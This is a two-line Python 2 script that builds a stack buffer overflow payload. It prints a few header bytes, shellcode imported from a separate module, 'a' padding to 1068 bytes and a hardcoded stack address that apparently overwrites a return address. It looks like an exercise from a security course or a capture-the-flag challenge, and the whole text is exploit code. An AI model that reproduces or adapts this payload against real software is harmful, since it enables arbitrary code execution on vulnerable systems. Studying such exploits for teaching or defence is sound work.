from shellcode import shellcode
print "\x00"+"\x01"+"\x00"+"\x80"+shellcode+"a"*(1068-len(shellcode))+"\x50"+"\x6d"+"\xfe"+"\xbf";
